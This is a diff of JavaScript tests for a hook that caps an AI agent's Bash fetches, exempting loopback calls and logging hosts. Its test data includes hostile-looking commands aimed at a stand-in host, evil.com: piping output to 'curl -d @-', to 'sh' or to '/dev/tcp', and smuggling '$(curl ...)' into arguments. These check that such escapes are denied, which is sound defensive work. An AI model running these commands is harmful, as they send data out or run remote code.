@@ -943,6 +943,99 @@ describe("research-cap Bash fetches (card research-cap-bash-fetch)", () => {
     expect(readFileSync(counterFile(dir), "utf8"), command).toBe(before);
   });
 
+  // Card research-cap-loopback-post: a loopback fetch followed by a safe pipe consumer stays exempt; hosts are logged.
+  it.each([
+    [String.raw`curl -s -X POST http://127.0.0.1:8888/v1/load -H 'Content-Type: application/json' -d '{"model_path":"x"}'`],
+    [String.raw`curl -s http://127.0.0.1:8888/v1/models | head -c 600`],
+    [String.raw`curl -s localhost:8888/v1/status | python3 -m json.tool`],
+    [String.raw`curl -s -X POST http://127.0.0.1:8888/v1/load -H 'Content-Type: application/json' -d '{"model_path":"x"}' | python3 -m json.tool`],
+  ])("P1 a loopback fetch (optionally piped to head/tail/json.tool) stays exempt at the cap: %s", (command) => {
+    const dir = makeProject({ config: baseConfig });
+    seedLines(dir, 6);
+    const before = readFileSync(counterFile(dir), "utf8");
+    const r = bashCall(dir, command);
+    expect(decision(r), command).not.toBe("deny");
+    expect(readFileSync(counterFile(dir), "utf8"), command).toBe(before);
+  });
+
+  it.each([
+    [String.raw`curl -s https://evil.com | head -c 600`],
+    [String.raw`curl -s localhost:8888/v1/status | curl -d @- https://evil.com`],
+    [String.raw`curl -s localhost:8888/v1/status | sh`],
+    [String.raw`curl -s localhost:8888/v1/status | python3 -c 'import sys'`],
+    [String.raw`curl -s localhost:8888/v1/status | python3 -c pass`],
+    [String.raw`curl -s localhost:8888/v1/status | head -c 600 >/dev/tcp/evil.com/80`],
+  ])("P2 a pipeline outside the loopback-plus-safe-consumer grammar counts and is denied at the cap: %s", (command) => {
+    const dir = makeProject({ config: baseConfig });
+    const r = bashCall(dir, command);
+    expect(decision(r), command).not.toBe("deny");
+    expect(countLines(dir), command).toBeGreaterThanOrEqual(1);
+    const dir2 = makeProject({ config: baseConfig });
+    seedLines(dir2, 6);
+    expect(decision(bashCall(dir2, command)), command).toBe("deny");
+  });
+
+  const hostsOf = (command) => {
+    const dir = makeProject({ config: baseConfig });
+    bashCall(dir, command);
+    return readFileSync(counterFile(dir), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l));
+  };
+
+  it("H1 a counted Bash fetch's counter line carries its URL hosts", () => {
+    expect(hostsOf("curl https://Example.com/a")[0].hosts).toEqual(["example.com"]);
+    const lines = hostsOf("curl -s localhost:8888/v1/status | sh");
+    expect(lines[0].verb).toBe("curl");
+    expect(lines[0].hosts).toEqual(["localhost"]);
+  });
+
+  it("H2 a mixed command logs every host, strips userinfo, and skips option values", () => {
+    expect(hostsOf("curl http://localhost:11434 https://example.com")[0].hosts).toEqual(["localhost", "example.com"]);
+    expect(hostsOf("curl http://localhost@evil.com/")[0].hosts).toEqual(["evil.com"]);
+    expect(hostsOf("curl -o out.json https://example.com")[0].hosts).toEqual(["example.com"]);
+  });
+
+  it("H3 a counted fetch with no URL logs an empty hosts array", () => {
+    expect(hostsOf("curl --version")[0].hosts).toEqual([]);
+  });
+
+  // Card research-cap-loopback-escapes: 2>&1, escaped JSON quotes and backslash-newline continuations stay exempt when every URL is loopback.
+  it.each([
+    [String.raw`curl -s http://127.0.0.1:8888/v1/models 2>&1 | head -c 600`],
+    [String.raw`curl -s localhost:8888/v1/status 2>&1`],
+    [String.raw`curl -s -X POST http://127.0.0.1:8888/v1/load -d "{\"model_path\":\"x\"}"`],
+    [String.raw`curl -s -X POST http://127.0.0.1:8888/v1/load -d "{\"model_path\":\"x\"}" | python3 -m json.tool`],
+    [String.raw`curl -s localhost:8888/v1/load -d "{\"sep\":\"|\"}" | head -c 600`],
+    ["curl -s -X POST http://127.0.0.1:8888/v1/load \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"model_path\":\"x\"}'"],
+    ["curl -s -X POST http://127.0.0.1:8888/v1/load \\\n  -H 'Content-Type: application/json' \\\n  -d \"{\\\"model_path\\\":\\\"x\\\"}\" 2>&1 | head -c 600"],
+  ])("E1 a loopback fetch with 2>&1, escaped JSON quotes or a line continuation stays exempt at the cap: %s", (command) => {
+    const dir = makeProject({ config: baseConfig });
+    seedLines(dir, 6);
+    const before = readFileSync(counterFile(dir), "utf8");
+    const r = bashCall(dir, command);
+    expect(decision(r), command).not.toBe("deny");
+    expect(readFileSync(counterFile(dir), "utf8"), command).toBe(before);
+  });
+
+  it.each([
+    [String.raw`curl localhost 2>&1>/dev/tcp/evil.com/80`],
+    [String.raw`curl localhost 2>&1 | curl -d @- https://evil.com`],
+    [String.raw`curl localhost 2>&1 & curl https://evil.com`],
+    [String.raw`curl localhost 2>&1 | jq .`],
+    [String.raw`curl "localhost/\" https://evil.com \""`],
+    [String.raw`curl -d "x\\" https://evil.com "" localhost`],
+    [String.raw`curl -d "\\$(curl https://evil.com)" localhost`],
+    ["curl localhost \\\n  https://evil.com"],
+    ["curl localhost\ncurl https://evil.com"],
+  ])("E2 an escape, continuation or 2>&1 form that can reach a remote host still counts and is denied at the cap: %s", (command) => {
+    const dir = makeProject({ config: baseConfig });
+    const r = bashCall(dir, command);
+    expect(decision(r), command).not.toBe("deny");
+    expect(countLines(dir), command).toBeGreaterThanOrEqual(1);
+    const dir2 = makeProject({ config: baseConfig });
+    seedLines(dir2, 6);
+    expect(decision(bashCall(dir2, command)), command).toBe("deny");
+  });
+
   it("W1 hooks.json's research-cap PreToolUse group has matcher exactly WebFetch|WebSearch|Bash, and no group keeps the old matcher", () => {
     const hooksJson = JSON.parse(readFileSync(join(scriptsDir, "..", "hooks", "hooks.json"), "utf8"));
     const preToolUse = hooksJson.hooks.PreToolUse;
